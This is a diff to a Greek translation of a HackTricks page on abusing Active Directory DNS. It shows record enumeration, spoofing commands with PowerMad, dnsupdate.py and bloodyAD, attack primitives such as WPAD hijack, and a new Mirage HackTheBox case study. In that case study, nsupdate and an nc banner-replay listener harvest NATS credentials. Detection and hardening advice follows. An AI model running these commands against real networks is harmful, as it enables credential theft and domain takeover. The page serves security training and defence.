@@ -2,9 +2,9 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Από προεπιλογή, **οποιοσδήποτε χρήστης** στο Active Directory μπορεί να **καταγράψει όλα τα DNS records** στις ζώνες DNS του Domain ή του Forest, παρόμοια με μια μεταφορά ζώνης (οι χρήστες μπορούν να καταγράψουν τα παιδικά αντικείμενα μιας ζώνης DNS σε ένα περιβάλλον AD).
+Από προεπιλογή, **οποιοσδήποτε χρήστης** στο Active Directory μπορεί να **απαριθμήσει όλες τις εγγραφές DNS** στις ζώνες DNS του Domain ή του Forest, παρόμοια με ένα zone transfer (οι χρήστες μπορούν να απαριθμήσουν τα child objects μιας DNS zone σε ένα AD περιβάλλον).
 
-Το εργαλείο [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) επιτρέπει την **καταγραφή** και **εξαγωγή** **όλων των DNS records** στη ζώνη για σκοπούς αναγνώρισης εσωτερικών δικτύων.
+Το εργαλείο [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) επιτρέπει την **απαρίθμηση** και **εξαγωγή** **όλων των εγγραφών DNS** στη ζώνη για recon σκοπούς εσωτερικών δικτύων.
 ```bash
 git clone https://github.com/dirkjanm/adidnsdump
 cd adidnsdump
@@ -21,7 +21,7 @@ adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.loca
 
 cat records.csv
 ```
->  adidnsdump v1.4.0 (Απρίλιος 2025) προσθέτει JSON/Greppable (`--json`) έξοδο, πολυνηματική επίλυση DNS και υποστήριξη για TLS 1.2/1.3 κατά την σύνδεση σε LDAPS
+>  adidnsdump v1.4.0 (Απρίλιος 2025) προσθέτει JSON/Greppable (`--json`) έξοδο, πολυνηματική επίλυση DNS και υποστήριξη για TLS 1.2/1.3 κατά τη σύνδεση με LDAPS
 
 Για περισσότερες πληροφορίες διαβάστε [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
 
@@ -29,7 +29,7 @@ cat records.csv
 
 ## Δημιουργία / Τροποποίηση εγγραφών (ADIDNS spoofing)
 
-Επειδή η ομάδα **Authenticated Users** έχει **Create Child** στο DACL της ζώνης από προεπιλογή, οποιοσδήποτε λογαριασμός τομέα (ή λογαριασμός υπολογιστή) μπορεί να καταχωρήσει επιπλέον εγγραφές. Αυτό μπορεί να χρησιμοποιηθεί για hijacking κυκλοφορίας, NTLM relay coercion ή ακόμη και πλήρη συμβιβασμό τομέα.
+Επειδή η ομάδα **Authenticated Users** έχει εξ ορισμού **Create Child** στο zone DACL, οποιοσδήποτε λογαριασμός domain (ή λογαριασμός υπολογιστή) μπορεί να καταχωρήσει επιπλέον εγγραφές. Αυτό μπορεί να χρησιμοποιηθεί για ανακατεύθυνση κυκλοφορίας, εξαναγκασμό NTLM relay ή ακόμα και για πλήρη συμβιβασμό του domain.
 
 ### PowerMad / Invoke-DNSUpdate (PowerShell)
 ```powershell
@@ -46,7 +46,7 @@ Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
 # add/replace an A record via secure dynamic-update
 python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
 ```
-*(dnsupdate.py αποστέλλεται με το Impacket ≥0.12.0)*
+*(dnsupdate.py συνοδεύεται από Impacket ≥0.12.0)*
 
 ### BloodyAD
 ```bash
@@ -54,26 +54,57 @@ bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.
 ```
 ---
 
-## Κοινές επιθέσεις
+## Common attack primitives
 
-1. **Wildcard record** – `*.<zone>` μετατρέπει τον AD DNS server σε έναν πανεπιχειρησιακό απαντητή παρόμοιο με την παραποίηση LLMNR/NBNS. Μπορεί να χρησιμοποιηθεί για την καταγραφή NTLM hashes ή για την αναμετάδοση τους σε LDAP/SMB.  (Απαιτεί να είναι απενεργοποιημένο το WINS-lookup.)
-2. **WPAD hijack** – προσθέστε `wpad` (ή μια **NS** εγγραφή που δείχνει σε έναν επιτιθέμενο για να παρακάμψει τη Λίστα Παγκόσμιας Ερώτησης-Φραγής) και διαφανώς προξενήστε εξερχόμενα HTTP αιτήματα για να συλλέξετε διαπιστευτήρια.  Η Microsoft διόρθωσε τις παρακάμψεις wildcard/ DNAME (CVE-2018-8320) αλλά οι **NS-εγγραφές εξακολουθούν να λειτουργούν**.
-3. **Stale entry takeover** – διεκδικήστε τη διεύθυνση IP που ανήκε προηγουμένως σε έναν υπολογιστή και η σχετική DNS εγγραφή θα συνεχίσει να επιλύεται, επιτρέποντας επιθέσεις περιορισμένης εξουσιοδότησης ή Shadow-Credentials χωρίς να αγγίξετε καθόλου το DNS.
-4. **DHCP → DNS spoofing** – σε μια προεπιλεγμένη εγκατάσταση Windows DHCP+DNS, ένας μη αυθεντικοποιημένος επιτιθέμενος στο ίδιο υποδίκτυο μπορεί να αντικαταστήσει οποιαδήποτε υπάρχουσα A εγγραφή (συμπεριλαμβανομένων των Domain Controllers) στέλνοντας πλαστές DHCP αιτήσεις που ενεργοποιούν δυναμικές ενημερώσεις DNS (Akamai “DDSpoof”, 2023).  Αυτό δίνει μηχανή-στη-μέση πάνω από Kerberos/LDAP και μπορεί να οδηγήσει σε πλήρη κατάληψη τομέα.
-5. **Certifried (CVE-2022-26923)** – αλλάξτε το `dNSHostName` ενός λογαριασμού μηχανής που ελέγχετε, καταχωρίστε μια αντίστοιχη A εγγραφή, στη συνέχεια ζητήστε ένα πιστοποιητικό για αυτό το όνομα για να προσποιηθείτε τον DC. Εργαλεία όπως το **Certipy** ή το **BloodyAD** αυτοματοποιούν πλήρως τη διαδικασία.
+1. **Wildcard record** – το `*.<zone>` μετατρέπει τον AD DNS server σε enterprise-wide responder, παρόμοιο με το LLMNR/NBNS spoofing. Μπορεί να καταχραστεί για να συλλέξει NTLM hashes ή να τα relay-άρει σε LDAP/SMB. (Requires WINS-lookup to be disabled.)
+2. **WPAD hijack** – προσθέστε `wpad` (ή μια **NS** record που δείχνει σε attacker host για να bypass-άρετε το Global-Query-Block-List) και κάντε transparent proxy τα εξερχόμενα HTTP requests για να harvest-άρετε διαπιστευτήρια. Microsoft patched τα wildcard/ DNAME bypasses (CVE-2018-8320) αλλά οι **NS-records still work**.
+3. **Stale entry takeover** – διεκδικήστε την IP address που προηγουμένως ανήκε σε ένα workstation και η αντίστοιχη DNS εγγραφή θα εξακολουθεί να επιλύεται, επιτρέποντας resource-based constrained delegation ή Shadow-Credentials attacks χωρίς να αγγίξετε καθόλου το DNS.
+4. **DHCP → DNS spoofing** – σε μια default Windows DHCP+DNS ανάπτυξη, ένας unauthenticated attacker στο ίδιο subnet μπορεί να overwrite οποιαδήποτε υπάρχουσα A record (συμπεριλαμβανομένων Domain Controllers) στέλνοντας forged DHCP requests που ενεργοποιούν dynamic DNS updates (Akamai “DDSpoof”, 2023). Αυτό παρέχει machine-in-the-middle πάνω σε Kerberos/LDAP και μπορεί να οδηγήσει σε πλήρη domain takeover.
+5. **Certifried (CVE-2022-26923)** – αλλάξτε το `dNSHostName` ενός machine account που ελέγχετε, καταχωρήστε μια matching A record, και στη συνέχεια ζητήστε ένα certificate για αυτό το όνομα για να impersonate-άρετε τον DC. Εργαλεία όπως **Certipy** ή **BloodyAD** αυτοματοποιούν πλήρως τη ροή.
 
 ---
 
-## Ανίχνευση & σκληραγώγηση
+### Internal service hijacking via stale dynamic records (NATS case study)
 
-* Αρνηθείτε στους **Authenticated Users** το δικαίωμα *Create all child objects* σε ευαίσθητες ζώνες και αναθέστε δυναμικές ενημερώσεις σε έναν ειδικό λογαριασμό που χρησιμοποιείται από το DHCP.
-* Εάν απαιτούνται δυναμικές ενημερώσεις, ρυθμίστε τη ζώνη σε **Secure-only** και ενεργοποιήστε την **Name Protection** στο DHCP ώστε μόνο το αντικείμενο υπολογιστή του ιδιοκτήτη να μπορεί να αντικαταστήσει τη δική του εγγραφή.
-* Παρακολουθήστε τα IDs γεγονότων του DNS Server 257/252 (δυναμική ενημέρωση), 770 (μεταφορά ζώνης) και τις εγγραφές LDAP στο `CN=MicrosoftDNS,DC=DomainDnsZones`.
-* Εμποδίστε επικίνδυνα ονόματα (`wpad`, `isatap`, `*`) με μια σκόπιμα καλοήθη εγγραφή ή μέσω της Παγκόσμιας Λίστας Φραγής Ερωτήσεων.
-* Διατηρήστε τους DNS servers ενημερωμένους – π.χ., τα σφάλματα RCE CVE-2024-26224 και CVE-2024-26231 έφτασαν **CVSS 9.8** και είναι εκμεταλλεύσιμα απομακρυσμένα κατά των Domain Controllers.
+When dynamic updates stay open to all authenticated users, **a de-registered service name can be re-claimed and pointed to attacker infrastructure**. The Mirage HTB DC exposed the hostname `nats-svc.mirage.htb` after DNS scavenging, so any low-privileged user could:
+
+1. **Επιβεβαιώστε ότι η εγγραφή λείπει** και μάθετε το SOA με `dig`:
+```bash
+dig @dc01.mirage.htb nats-svc.mirage.htb
+```
+2. **Επαναδημιουργήστε την εγγραφή** προς μια εξωτερική/VPN διεπαφή που ελέγχουν:
+```bash
+nsupdate
+> server 10.10.11.78
+> update add nats-svc.mirage.htb 300 A 10.10.14.2
+> send
+```
+3. **Impersonate the plaintext service**. Οι πελάτες NATS αναμένουν να δουν ένα `INFO { ... }` banner πριν στείλουν διαπιστευτήρια, οπότε η αντιγραφή ενός νόμιμου banner από τον πραγματικό broker είναι αρκετή για να συλλέξει μυστικά:
+```bash
+# Capture a single INFO line from the real service and replay it to victims
+nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
+```
+Οποιοδήποτε client που επιλύει το hijacked όνομα θα αμέσως leak το JSON `CONNECT` frame του (συμπεριλαμβανομένων των `"user"`/`"pass"`) στον listener. Τρέχοντας το επίσημο binary `nats-server -V` στον attacker host, απενεργοποιώντας τη redaction των logs του, ή απλά sniffing τη συνεδρία με Wireshark αποκαλύπτει τα ίδια plaintext credentials επειδή το TLS ήταν optional.
+
+4. **Pivot with the captured creds** – στο Mirage ο κλεμμένος NATS account παρείχε πρόσβαση σε JetStream, που αποκάλυψε ιστορικά authentication events που περιείχαν επαναχρησιμοποιήσιμα AD usernames/passwords.
+
+Αυτό το μοτίβο ισχύει για κάθε AD-integrated service που βασίζεται σε ανεξασφαλισμένα TCP handshakes (HTTP APIs, RPC, MQTT, κ.λπ.): μόλις το DNS record υφαρπαχθεί, ο attacker γίνεται το service.
+
+---
+
+## Ανίχνευση & σκληροποίηση
+
+* Deny **Authenticated Users** the *Create all child objects* right on sensitive zones and delegate dynamic updates to a dedicated account used by DHCP.
+* If dynamic updates are required, set the zone to **Secure-only** and enable **Name Protection** in DHCP so that only the owner computer object can overwrite its own record.
+* Monitor DNS Server event IDs 257/252 (dynamic update), 770 (zone transfer) and LDAP writes to `CN=MicrosoftDNS,DC=DomainDnsZones`.
+* Block dangerous names (`wpad`, `isatap`, `*`) with an intentionally-benign record or via the Global Query Block List.
+* Keep DNS servers patched – e.g., RCE bugs CVE-2024-26224 and CVE-2024-26231 reached **CVSS 9.8** and are remotely exploitable against Domain Controllers.
+
+
 
 ## Αναφορές
 
-* Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL and More”  (2018, εξακολουθεί να είναι η de-facto αναφορά για επιθέσεις wildcard/WPAD)
-* Akamai – “Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates” (Δεκ 2023)
+- Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL and More”  (2018, εξακολουθεί να είναι η de-facto reference για wildcard/WPAD attacks)
+- Akamai – “Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates” (Dec 2023)
+- [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
 {{#include ../../banners/hacktricks-training.md}}
